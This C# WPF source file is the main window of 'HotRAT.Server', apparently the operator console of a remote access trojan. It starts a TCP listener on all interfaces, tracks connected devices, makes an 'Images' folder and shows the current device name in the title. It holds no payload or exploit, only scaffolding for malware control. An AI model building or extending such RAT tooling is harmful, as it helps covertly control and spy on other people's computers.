using Data;
using System.IO;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace HotRAT.Server
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public static TabControl? tabControl { get; private set; }
        public static TCPServer server = new TCPServer("0.0.0.0", ServerSettings.Port);
        public MainWindow()
        {
            InitializeComponent();
            this.Loaded += (_, _) =>
            {
                MainData.DeviceNumber = 0;
                MainData.StartTime = DateTime.Now.ToString("G");
                ChangeTitle();
                Directory.CreateDirectory("Images");
                SoftWareSettings.IsLight = true;
                server.Start();
            };
            tabControl = TabCont;
        }

        void ChangeTitle()
        {
            Title = $"HotRAT - Nextgen [WPF Server]  UserName[{MainData.NowDeviceName}] | DeviceNumber [{MainData.DeviceNumber}] | StartTime[{MainData.StartTime}]";
        }
    }
}